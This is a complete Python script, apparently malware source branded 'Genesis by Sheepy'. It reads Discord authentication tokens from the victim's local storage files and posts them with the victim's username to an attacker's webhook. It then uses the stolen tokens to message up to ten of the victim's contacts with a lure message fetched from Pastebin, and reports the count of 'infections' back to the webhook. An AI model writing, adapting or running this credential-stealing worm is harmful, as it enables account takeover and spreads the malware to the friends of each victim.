import requests
import os
import glob
import re
import time
import getpass
from os import remove
from sys import argv


MESSAGE = requests.get("<Pastebin link to the message that u want to be sent to the target's friends>").text
WEBHOOK = "<Webhook to where the tokens will be sent to>"

def getTokens():
	tokns = []
	appdatapath = os.getenv('APPDATA')
	files = glob.glob(appdatapath + r"\Discord\Local Storage\leveldb\*.ldb")
	files.extend(glob.glob(appdatapath + r"\Discord\Local Storage\leveldb\*.log"))
	for file in files:
		with open( file, 'r',encoding='ISO-8859-1') as content_file:
			try:
				content = content_file.read()
				possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)]
				if len(possible) > 0:
					tokns.extend(possible)
			except:
				pass
	return tokns


def SendTokens(tkns):

	content = f"```css\nGrabbed {len(tkns)} tokens from {getpass.getuser()}\n"

	for tkn in tkns:
		content += tkn + "\n"

	content += "```"
	payload = {
	"content" : content,
	"avatar_url" : "https://pbs.twimg.com/profile_images/1090355063329964032/2G_6k1E7_400x400.jpg",
	"username" : "Genesis by Sheepy"
	}
	requests.post(WEBHOOK, data=payload)


def SendSelf(token, id, message):
	data = {
	"content": message,
	"tts": "false"
	}
	if "author" in requests.post(f"https://discordapp.com/api/v6/channels/{id}/messages", headers={"authorization":token},data=data ).text:
		return True
	else:
		return False


def Finished_Infections(count):
	payload = {
	"content" : f"Successfully sent self to {count} friends from {getpass.getuser()} :D",
	"avatar_url" : "https://pbs.twimg.com/profile_images/1090355063329964032/2G_6k1E7_400x400.jpg",
	"username" : "Genesis by Sheepy"
	}
	requests.post(WEBHOOK, data=payload)


tkns = getTokens()
if len(tkns) < 1:
	exit(0)

SendTokens(tkns)

sent = 0
for tkn in tkns:
	try:
		userid = requests.get("https://discordapp.com/api/v7/users/@me", headers={"authorization":tkn}).text.split('{"id": "')[1].split('"')[0]
		text = requests.get(f"https://discordapp.com/api/v6/users/{userid}/channels", headers={"authorization":tkn}).text
		if ', {"id": "' in text:
			i = 1
			for id in text.split(', {"id": "'):
				try:
					if sent >= 10:
						break
					tryid = text.split(', {"id": "')[i + 1].split('"')[0]
					if SendSelf(tkn, tryid, MESSAGE):
						print(f"Sent to {tryid}")
						sent = sent+1
					time.sleep(3)
				except:
					pass
				i = i + 1

	except:
		pass

if sent > 0:
	Finished_Infections(sent)
